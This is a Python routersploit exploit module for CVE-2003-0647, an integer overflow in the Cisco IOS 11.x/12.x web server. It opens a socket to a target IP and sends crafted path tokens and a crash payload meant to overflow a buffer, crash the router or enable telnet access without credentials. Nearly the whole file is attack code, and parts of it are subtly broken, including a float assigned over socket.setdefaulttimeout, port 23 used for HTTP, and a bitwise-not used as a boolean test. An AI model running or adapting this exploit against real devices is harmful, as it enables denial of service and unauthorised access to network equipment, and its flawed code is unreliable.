import socket
import os
import re

from routersploit import (
    exploits,
    print_status,
    print_success,
    print_error,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Only in test mode, not really exploit! Just send 2Gig. bits data, It will take very long time!
    -*- Thanks a lot for FX team hard working! -*-
    """
    __info__ = {
        'name': 'Cisco IOS 11.x remote web integer overflow',
        'description': 'Module exploits Cisco IOS HTTP 11.x/12.x RCE vulnerability. (Smash Crash Test)\n'
                       'If target is vulnerable, it is possible to patch execution flow \n'
                       'to allow credless telnet interaction with highest privilege level.',
        'authors': [
            'FX of Phenoelit <fx at phenoelit.de>', 
        ],
        'references': [
            'https://www.exploit-db.com/exploits/77/',
        ],
        'devices': [
            'Cisco IOS software 11.x / 12.x',
        ],
        'id': 'CVE-2003-0647',
    }

    target = exploits.Option('', 'Target IP address', validators=validators.ipv4)
    http_port = exploits.Option(23, 'Target Port', validators=validators.integer)

    action = exploits.Option('set', 'set / unset credless authentication for Telnet service')
    device = exploits.Option(-1, 'Target device - use "show devices"', validators=validators.integer)

    HTTPfd = None
    socket.setdefaulttimeout = 0.50
    os.environ['no_proxy'] = '127.0.0.1,localhost'
    CRLF = "\r\n\r\n"
    HTTPREQEND = " HTTP/1.0\r\n\r\n"

    payloads = [
        '/Cisco',  # Token 6
        '/FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF',  # Token 50
        '/FXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFXFX/',  # TOken 48 with close gap
        'BB%FF%FF%FF%FF%00%00%00%00'  # Crash - return zero
    ]

    def HTTPpre(self):
        # https://stackoverflow.com/questions/5755507/creating-a-raw-http-request-with-sockets
        HOST = self.target
        PORT = self.http_port
        # create an INET, STREAMing socket
        self.HTTPfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        """
        ***********************************************************************************
        * Note that the connect() operation is subject to the timeout setting,
        * and in general it is recommended to call settimeout() before calling connect()
        * or pass a timeout parameter to create_connection().
        * The system network stack may return a connection timeout error of its own
        * regardless of any Python socket timeout setting.
        ***********************************************************************************
        """
        self.HTTPfd.settimeout(0.30)
        """
        **************************************************************************************
        * Avoid socket.error: [Errno 98] Address already in use exception
        * The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state,
        * without waiting for its natural timeout to expire.
        **************************************************************************************
        """
        self.HTTPfd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # s.setblocking(0)
        self.HTTPfd.connect((HOST, PORT))
        print_status("HTTP-fd create success")
        self.HTTPfd.send("GET ")
        print_status("Executed Parse 1!")
        # self.HTTPfd.shutdown(1)

    def HTTPsend(self, data):
        self.HTTPfd.send(data)

    def run(self):
        if self.check() and self.check() != -1:
            self.HTTPpre()
            print_status("Target seems to be vulnerable!")
            print_status("Filling normal buffer....")
            for idx in range(0, 5):
                self.HTTPsend(self.payloads[1])  # Send token50 5 times
            self.HTTPsend(self.payloads[0])  # Send token6
            print_status("Cancel to send 2GB data... just detection ...")
            # while(idx<0x28F5C28):
            #     self.HTTPsend(self.payloads[1])
            #     print_status("Sending...")
            #     idx = idx+1
            print_status("Close the gap and overflow...")
            self.HTTPsend(self.payloads[2])
            self.HTTPsend(self.payloads[3])  # Boom!!!
            self.HTTPsend(self.HTTPREQEND)    # Return~
            if ~self.check():
                print_success("Target down, Vulnerable!")
        else:
            print_error("Target seems not in suffer or target down!")

    @mute
    def check(self):
        # it is not possible to verify if target is vulnerable without exploiting system
        # Fx team use a method with protocol - udp echo
        # Too ancient, the modern IOS core detection method is ICMPv6 seq No. dispatch.
        # Above method not perfect and doesn't fit IOS software today!
        try:
            checkfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            checkfd.connect((self.target, self.http_port))
            checkfd.close()
        except Exception:
            return False

        return True
